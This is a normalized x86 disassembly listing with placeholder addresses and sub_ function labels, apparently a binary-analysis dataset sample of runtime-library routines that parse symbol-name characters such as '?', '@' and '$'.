lea eax [ ebp - 0x24 ]
push eax
call sub_418b62
mov ecx [ eax ]
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x1c ] ecx
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov [ esp ] r--data
call sub_415d61
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x24 ]
call sub_415aa8
mov esi [ ebp - 0x24 ]
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test [ rwxdata ] ecx
je r-xdata
cmp al 0x40
je r-xdata
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] esi
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_417c3a
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ rwxdata ]
mov eax [ ebp + 0x8 ]
test edx ebx
jne r-xdata
and [ ebp - 0x24 ] 0x0
and [ ebp - 0x20 ] 0xffff0000
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call sub_417c3a
pop ecx
pop ecx
jmp r-xdata
sub_418b62
mov edi edi
push ebp
mov ebp esp
sub esp 0xb8
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov edi 0xffff00ff
mov [ esi + 0x4 ] bl
and [ esi + 0x4 ] edi
mov [ esi ] ebx
mov [ ebp + 0xb ] bl
jmp r-xdata
cmp [ esi + 0x4 ] bl
je r-xdata
mov eax [ rwxdata ]
mov al [ eax ]
cmp al bl
je r-xdata
mov eax [ rwxdata ]
mov al [ eax ]
cmp al bl
je r-xdata
cmp al 0x40
je r-xdata
cmp [ esi ] ebx
jne r-xdata
cmp al 0x40
je r-xdata
cmp [ rwxdata ] bl
je r-xdata
push esi
lea eax [ ebp - 0x40 ]
push eax
push r--data
lea eax [ ebp - 0x48 ]
push eax
push 0x1
lea ecx [ ebp - 0x38 ]
call sub_41548d
mov ecx eax
call sub_415faf
mov ecx eax
call sub_415cc7
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
push 0x1
mov ecx esi
call sub_4155c6
jmp r-xdata
pop edi
mov eax esi
pop esi
pop ebx
leave
retn
and [ esi + 0x4 ] edi
mov [ esi + 0x4 ] 0x2
mov [ esi ] ebx
jmp r-xdata
cmp [ esi ] ebx
je r-xdata
cmp [ rwxdata ] bl
je r-xdata
mov ecx [ rwxdata ]
cmp [ ecx ] 0x3f
jne r-xdata
push esi
lea eax [ ebp - 0x20 ]
push eax
push r--data
lea ecx [ ebp - 0x90 ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x20 ]
mov [ esi ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x4 ] eax
cmp [ ebp + 0xb ] bl
je r-xdata
lea eax [ ebp - 0x48 ]
push esi
push eax
lea eax [ ebp - 0x40 ]
inc ecx
mov [ rwxdata ] ecx
movsx eax [ ecx ]
sub eax 0x24
je r-xdata
push esi
lea eax [ ebp - 0x28 ]
push eax
push 0x5b
lea ecx [ ebp - 0x98 ]
call sub_415852
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x28 ]
mov [ esi ] eax
mov eax [ ebp - 0x24 ]
mov [ esi + 0x4 ] eax
mov [ ebp + 0xb ] bl
lea eax [ ebp - 0x88 ]
push esi
dec ecx
push eax
mov [ rwxdata ] ecx
lea eax [ ebp - 0x38 ]
jmp r-xdata
dec eax
je r-xdata
push ebx
push 0x1
push eax
call sub_41773a
add esp 0xc
push 0x40
push rwxdata
lea ecx [ ebp - 0x30 ]
call sub_4158bc
push esi
lea eax [ ebp - 0x10 ]
push eax
push r--data
lea ecx [ ebp - 0x78 ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x10 ]
mov [ esi ] eax
mov eax [ ebp - 0xc ]
mov [ esi + 0x4 ] eax
mov ecx [ rwxdata ]
cmp [ ecx ] 0x9
je r-xdata
sub eax 0x1a
je r-xdata
lea eax [ ebp - 0x30 ]
push eax
call sub_4155fd
jmp r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0x5f
jne r-xdata
dec eax
dec eax
je r-xdata
lea eax [ ebp - 0xa0 ]
push eax
call sub_4188f4
pop ecx
push eax
lea eax [ ebp - 0x18 ]
push eax
push 0x60
lea ecx [ ebp - 0x58 ]
call sub_415852
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
push 0x27
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_415d0f
push esi
lea eax [ ebp - 0x68 ]
push eax
lea ecx [ ebp - 0x8 ]
jmp r-xdata
cmp [ ecx + 0x2 ] 0x3f
jne r-xdata
sub eax 0x8
push esi
je r-xdata
call sub_415cc7
mov [ rwxdata ] eax
push esi
lea eax [ ebp - 0xb0 ]
push eax
push ebx
lea eax [ ebp - 0x80 ]
push ebx
push eax
call sub_41700d
add esp 0xc
mov ecx eax
call sub_415cc7
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ rwxdata ]
cmp [ eax ] 0x40
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
push 0x5d
lea eax [ ebp - 0x50 ]
push eax
push ebx
lea eax [ ebp - 0x70 ]
inc ecx
push 0x1
push eax
mov [ rwxdata ] ecx
call sub_41773a
add esp 0xc
mov ecx eax
call sub_415f8b
mov ecx eax
call sub_415cc7
mov [ ebp + 0xb ] 0x1
jmp r-xdata
lea eax [ ebp - 0xa8 ]
push eax
lea eax [ ebp - 0xb8 ]
push eax
call sub_41672d
pop ecx
jmp r-xdata
inc [ rwxdata ]
jmp r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
mov ecx eax
sub_418e19
mov edi edi
push ebp
mov ebp esp
mov eax [ rwxdata ]
mov cl [ eax ]
sub esp 0x38
test cl cl
jne r-xdata
cmp cl 0x36
jl r-xdata
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_415f43
mov eax [ ebp + 0x8 ]
add esp 0xc
leave
retn
cmp cl 0x5f
je r-xdata
cmp cl 0x39
jle r-xdata
push ebx
movsx ebx cl
sub ebx 0x36
inc eax
mov [ rwxdata ] eax
cmp ebx 0x29
jne r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
leave
retn
test ebx ebx
js r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
or ebx 0xffffffff
cmp ebx 0x3
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_415f43
mov eax [ ebp + 0x8 ]
add esp 0xc
jmp r-xdata
movsx ebx cl
sub ebx 0x3d
inc eax
mov [ rwxdata ] eax
cmp ebx 0x4
jl r-xdata
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0xffff0000
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
push edi
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x4 ]
mov edi ebx
and edi 0x2
mov [ ebp - 0x4 ] eax
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
jmp r-xdata
cmp ebx 0xffffffff
jne r-xdata
pop ebx
leave
retn
cmp ebx 0x7
jmp r-xdata
test bl 0x4
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push r--data
lea ecx [ ebp - 0x20 ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ rwxdata ]
cmp [ eax ] 0x0
je r-xdata
jle r-xdata
mov eax [ rwxdata ]
shr eax 0x1
not eax
test al 0x1
je r-xdata
mov eax [ rwxdata ]
shr eax 0x1
not eax
test al 0x1
lea eax [ ebp - 0x38 ]
push eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x1
lea ecx [ ebp - 0x38 ]
call sub_41548d
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x1c ]
lea eax [ ebp - 0x30 ]
push eax
call sub_418b62
pop ecx
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x20
lea ecx [ ebp - 0x38 ]
call sub_415852
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x18 ]
call sub_415aa8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
jmp r-xdata
lea eax [ ebp - 0x38 ]
push eax
call sub_415bb4
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_415070
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_415bb4
pop ecx
mov ecx eax
call sub_415cc7
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
call sub_417b9e
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_415070
call sub_417b9e
pop ecx
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x20
lea ecx [ ebp - 0x30 ]
call sub_415852
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x18 ]
call sub_415aa8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x38 ]
push 0x1
call sub_41548d
mov ecx eax
call sub_415cc7
jmp r-xdata
cmp al 0x40
jne r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ rwxdata ]
mov al [ eax ]
test al al
je r-xdata
push ebx
push 0x8
mov ecx rwxdata
call sub_414ed8
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x28
lea ecx [ ebp - 0x38 ]
call sub_415852
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
push 0x29
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
call sub_415d0f
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
xor ebx ebx
cmp [ esi ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
jmp r-xdata
mov eax [ rwxdata ]
inc [ rwxdata ]
and eax 0x60
cmp al 0x60
lea eax [ ebp - 0x38 ]
push eax
je r-xdata
xor esi esi
mov [ eax + 0x4 ] bl
and [ eax + 0x4 ] 0xffff00ff
mov [ eax ] ebx
mov esi eax
jmp r-xdata
pop edi
pop esi
call sub_4153b2
pop ecx
push eax
lea ecx [ ebp - 0x10 ]
call sub_415070
jmp r-xdata
call sub_4153b2
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
mov eax [ rwxdata ]
shr eax 0x8
not eax
test al 0x1
lea eax [ ebp - 0x38 ]
push eax
je r-xdata
cmp edi ebx
je r-xdata
lea eax [ ebp - 0x28 ]
push esi
push eax
call sub_415749
lea eax [ ebp - 0x38 ]
push eax
call sub_416205
add esp 0xc
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x28
lea ecx [ ebp - 0x30 ]
call sub_415852
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
push 0x29
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
call sub_415d0f
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_415aa8
mov eax [ rwxdata ]
and eax 0x60
cmp al 0x60
je r-xdata
call sub_4162e5
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_415070
call sub_4162e5
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_415aa8
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_415aa8
mov ecx [ ebp + 0x8 ]
push 0x3
call sub_41548d
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov ecx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x24 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
cmp esi ebx
je r-xdata
sub_4191f8
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rwxdata ]
mov al [ eax ]
push ebx
push esi
mov esi 0xffff0000
and [ ebp - 0x38 ] esi
push edi
xor edi edi
mov [ ebp - 0x1 ] 0x0
test al al
je r-xdata
cmp [ ebp + 0x18 ] edi
jne r-xdata
cmp al 0x24
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
call sub_41548d
mov esi [ ebp + 0xc ]
cmp [ esi ] edi
je r-xdata
mov ecx [ rwxdata ]
mov al [ ecx ]
xor edx edx
cmp al 0x41
setl dl
and [ ebp - 0x10 ] esi
movsx ebx al
mov [ ebp - 0x1c ] edi
dec edx
and edx 0x2b
add edx 0x16
sub ebx edx
xor edx edx
and [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] edx
push [ ebp + 0x18 ]
lea eax [ ebp - 0x1 ]
push eax
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_41636f
mov ecx [ ebp - 0x2c ]
add esp 0x10
cmp ecx edi
je r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax ] edi
je r-xdata
test [ esi + 0x4 ] 0x100
jne r-xdata
mov eax [ rwxdata ]
mov ecx eax
shr ecx 0x1
not ecx
test cl 0x1
je r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x28 ]
push eax
jmp r-xdata
push esi
mov eax [ ebp + 0x14 ]
cmp [ eax ] edi
je r-xdata
inc [ rwxdata ]
mov eax [ rwxdata ]
cmp [ eax ] 0x24
jne r-xdata
shr eax 0x11
not eax
test al 0x1
je r-xdata
mov eax [ rwxdata ]
shr eax 0x1
not eax
test al 0x1
je r-xdata
sub eax 0x3
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x1
push [ ebp + 0x8 ]
call sub_415f43
add esp 0xc
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_41548d
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x38 ]
push 0x20
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x28 ] eax
call sub_415d0f
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x2c ]
call sub_415cc7
jmp r-xdata
mov ecx [ rwxdata ]
mov al [ ecx ]
xor edx edx
cmp al 0x41
setl dl
movsx ebx al
dec edx
and edx 0x2b
add edx 0x16
sub ebx edx
mov edx [ ebp - 0x14 ]
jmp r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x1 ]
push eax
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
call sub_41636f
mov ecx [ ebp - 0x34 ]
add esp 0x10
test ecx ecx
jne r-xdata
test edx edx
je r-xdata
test edi edi
je r-xdata
cmp [ ecx ] 0x0
je r-xdata
mov eax [ rwxdata ]
shr eax 0x1
not eax
test al 0x1
je r-xdata
mov eax ebx
sub eax 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x30 ]
jmp r-xdata
push 0x8
mov eax [ ebp - 0x10 ]
push 0x20
lea ecx [ ebp - 0xc ]
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
call sub_415d0f
push 0x8
call sub_414eb9
add esp 0x4
push eax
lea eax [ ebp - 0x54 ]
lea ecx [ ebp - 0xc ]
push 0xa
call sub_414eb9
add esp 0x4
push eax
lea ecx [ ebp - 0x1c ]
call sub_415b7f
mov edi [ ebp - 0x1c ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
push 0x20
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x20 ] eax
call sub_415d0f
push 0xa
call sub_414eb9
add esp 0x4
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x24 ]
call sub_415faf
mov edi [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp ebx 0x1f
ja r-xdata
inc ecx
mov [ rwxdata ] ecx
test edx edx
je r-xdata
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
and [ eax + 0x4 ] 0xffff00ff
and [ eax ] 0x0
mov [ eax + 0x4 ] 0x2
jmp r-xdata
mov esi [ ebp + 0x10 ]
push esi
lea ecx [ ebp - 0xc ]
call sub_41587f
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x24 ]
call sub_415aa8
cmp [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x20 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
je r-xdata
push 0x9
jmp r-xdata
mov eax [ ebp - 0x10 ]
push 0x20
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x28 ] eax
call sub_415d0f
push 0x9
call sub_414eb9
add esp 0x4
push eax
lea eax [ ebp - 0x44 ]
lea ecx [ ebp - 0x2c ]
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x20 ] ecx
push 0x20
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x24 ] eax
call sub_415d0f
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_415aa8
mov eax [ ebp - 0x2c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x8 ] eax
call sub_414eb9
add esp 0x4
push eax
lea ecx [ ebp - 0x14 ]
call sub_415b7f
push eax
call sub_415faf
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] eax
jmp r-xdata
test bl 0x10
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x20
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x28 ] eax
call sub_415d0f
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x24 ]
call sub_415aa8
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ rwxdata ]
shr eax 0x1
not eax
test al 0x1
mov eax ebx
je r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
and eax 0xc
cmp al 0xc
jne r-xdata
and eax 0xc
cmp al 0xc
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
test bl 0x2
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_417b9e
pop ecx
push eax
lea ecx [ ebp - 0xc ]
call sub_415070
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
mov eax [ rwxdata ]
cmp [ eax ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x3c ]
push eax
push r--data
lea ecx [ ebp - 0x54 ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x3c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
mov eax [ rwxdata ]
cmp [ eax ] 0x0
lea eax [ ebp - 0xc ]
push eax
je r-xdata
test bl 0x1
je r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x3c ]
push eax
push r--data
lea ecx [ ebp - 0x54 ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x3c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_417b9e
pop ecx
mov ecx eax
call sub_415cc7
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x1
lea ecx [ ebp - 0xc ]
call sub_41578d
jmp r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_418b62
pop ecx
push eax
lea ecx [ ebp - 0xc ]
call sub_415070
lea eax [ ebp - 0x3c ]
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_41548d
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x3c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x38 ]
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
call sub_418b62
pop ecx
mov ecx eax
call sub_415cc7
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
xor edx edx
mov ebx 0x100
cmp [ ebp + 0x18 ] edx
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x3c ]
push eax
push r--data
lea ecx [ ebp - 0x54 ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x3c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
inc [ rwxdata ]
cmp al 0x40
jne r-xdata
mov eax [ rwxdata ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
or ecx ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
cmp [ esi ] edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
jmp r-xdata
or ecx 0x2000
mov eax [ ebp + 0x14 ]
cmp [ eax ] edx
je r-xdata
mov ecx [ esi + 0x4 ]
test ebx ecx
jne r-xdata
push eax
test ecx 0x800
je r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax ] edx
je r-xdata
push esi
jmp r-xdata
mov eax [ esi ]
mov [ ebp - 0xc ] eax
mov eax ecx
mov [ ebp - 0x8 ] eax
jmp r-xdata
push eax
lea eax [ ebp - 0x3c ]
push eax
push 0x20
lea ecx [ ebp - 0x54 ]
call sub_415852
mov ecx eax
call sub_415cc7
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x38 ]
push 0x20
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x28 ] eax
call sub_415d0f
push esi
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_415cc7
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
push 0x20
lea ecx [ ebp - 0x54 ]
call sub_415852
mov ecx eax
call sub_415cc7
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0xc ]
call sub_415aa8
sub_419797
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp - 0xc ]
mov edx 0xffff0000
and [ ebp - 0x4 ] edx
xor ecx ecx
and [ ebp - 0x8 ] ecx
and eax edx
mov edx [ rwxdata ]
test edx edx
je r-xdata
cmp al 0x3
jne r-xdata
cmp [ edx ] 0x3f
jne r-xdata
cmp al 0x2
je r-xdata
xor eax eax
leave
retn
lea eax [ ebp - 0x20 ]
push eax
call sub_4188f4
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov al [ edx + 0x1 ]
cmp al 0x40
jne r-xdata
push [ rwxdata ]
lea ecx [ ebp - 0x8 ]
call sub_415b7f
test [ rwxdata ] 0x1000
jne r-xdata
cmp al 0x24
jne r-xdata
add [ rwxdata ] 0x2
lea eax [ ebp - 0x18 ]
push eax
call sub_4188f4
pop ecx
push eax
lea eax [ ebp - 0x10 ]
push eax
push r--data
lea ecx [ ebp - 0x20 ]
call sub_41587f
mov ecx eax
call sub_415cc7
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
jmp r-xdata
push [ rwxdata ]
lea ecx [ ebp - 0x8 ]
push eax
call sub_4154d2
mov eax [ rwxdata ]
mov edx eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edx [ rwxdata ]
cmp [ edx ] 0x0
jne r-xdata
lea eax [ ebp - 0x20 ]
push 0x0
push eax
call sub_4175e3
pop ecx
pop ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
cmp al 0x2
jne r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
inc eax
mov [ rwxdata ] eax
add eax 0x7
and eax 0xfffffff8
push eax
call [ rwxdata ]
pop ecx
mov [ rwxdata ] eax
test eax eax
je r-xdata
mov eax [ ecx ]
call [ eax ]
mov eax [ rwxdata ]
test eax eax
jne r-xdata
mov eax [ rwxdata ]
mov [ rwxdata ] eax
cmp cl 0x20
jne r-xdata
mov al cl
mov [ edx ] al
mov eax [ rwxdata ]
leave
retn
mov [ edx ] cl
inc edx
inc eax
inc eax
mov [ edx ] cl
inc edx
jmp r-xdata
cmp [ eax ] 0x20
je r-xdata
inc eax
jmp r-xdata
sub_4198d6
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rwxdata ]
mov al [ eax ]
push ebx
xor ebx ebx
push esi
cmp al bl
je r-xdata
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_41548d
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
call sub_415d61
mov esi [ ebp + 0xc ]
cmp [ esi ] ebx
je r-xdata
cmp al 0x36
jl r-xdata
push edi
mov edi [ ebp + 0x10 ]
cmp [ edi ] ebx
je r-xdata
push esi
lea ecx [ ebp - 0x8 ]
call sub_415aa8
cmp al 0x5f
jne r-xdata
cmp al 0x39
jle r-xdata
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
pop edi
cmp [ esi ] ebx
je r-xdata
mov esi [ ebp + 0x14 ]
push ebx
push [ ebp + 0xc ]
lea eax [ ebp - 0x8 ]
push esi
push [ ebp + 0x10 ]
push eax
call sub_4191f8
xor eax eax
cmp [ esi ] 0x2a
sete al
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_416d00
add esp 0x20
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
call sub_41587f
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
cmp [ eax ] ebx
je r-xdata
push edi
lea ecx [ ebp - 0x8 ]
call sub_415aa8
push 0x20
lea ecx [ ebp - 0x8 ]
call sub_415d0f
mov eax [ ebp + 0x8 ]
jmp r-xdata
cmp [ esi ] ebx
je r-xdata
cmp [ esi ] ebx
je r-xdata
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
call sub_418e19
pop ecx
pop ecx
push esi
lea ecx [ ebp - 0x8 ]
call sub_415aa8
push eax
lea ecx [ ebp - 0x8 ]
call sub_415aa8
test [ esi + 0x4 ] 0x100
jne r-xdata
sub_419a2d
push 0x64
push r--data
call sub_408380
mov edi [ ebp + 0x14 ]
xor esi esi
cmp edi esi
jne r-xdata
push 0x5
call sub_40ec0c
pop ecx
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push 0x5
call sub_40ecce
pop ecx
